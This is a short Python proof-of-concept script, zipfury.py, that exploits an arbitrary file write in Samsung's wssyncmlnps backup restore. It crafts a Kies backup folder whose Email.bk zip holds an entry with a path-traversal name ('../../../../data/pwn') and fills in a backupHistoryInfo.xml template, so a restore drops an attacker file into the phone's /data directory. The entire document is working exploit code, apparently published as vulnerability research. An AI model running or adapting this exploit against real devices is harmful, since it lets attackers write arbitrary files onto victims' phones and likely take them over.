"""

zipfury.py: creates a poc to exploit the wssyncmlnps arbitrary file write.

Author: @rpaleari and @joystick

"""

import datetime
import os
import shutil
import zipfile

xml = "" # Here goes the content of an original backupHistoryInfo.xml file of
         # your phone. Do a backup with kies and copy it from there. Replace
         # <SavedTime>, <FolderPath>, and <FileSize> values respectively with
         # ###savedtime###, ###folderpath###, and ###filesize### to have them
         # automatically fixed by the script. Else, update them manually.

directory = "/dev/shm/"

def main():
    global xml
    global directory
    
    # prepare directory structure
    d = datetime.datetime.now()

    # Fix these according to your model/path
    subdir = "GT-I9192_" + d.strftime("%Y%m%d%H%M%S")
    path = ("C:\\Users\\User\\Documents\\samsung\\Kies\\Backup\\GT-I9192\\GT-I9192_\\" +
            subdir)
    fullpath = os.path.join(directory, subdir)
    if os.path.exists(fullpath):
        shutil.rmtree(fullpath)

    os.mkdir(fullpath)
    os.mkdir(os.path.join(fullpath, "EMAIL"))
    os.mkdir(os.path.join(os.path.join(fullpath, "EMAIL"), "BR"))
    filepath = os.path.join(os.path.join(os.path.join(fullpath, "EMAIL"), "BR"), "Email.bk")

    with zipfile.ZipFile(filepath, 'w') as pwnzip:
        pwnzip.write("AndroidMail.Main.xml")
        pwnzip.write("pwn", "../../../../../../../../../data/pwn")
    
    bkpath = os.path.join(fullpath, "backupHistoryInfo.xml")

    with open(bkpath, "w") as bkpfile:
        t = d.strftime("%Y-%m-%dT%H:%M:%S.%f+02:00")
        xml = xml.replace("###savedtime###", t)

        xml = xml.replace("###folderpath###", path)

        xml = xml.replace("###filesize###", str(os.path.getsize(filepath)))

        bkpfile.write(xml)
        
if __name__ == "__main__":
    main()
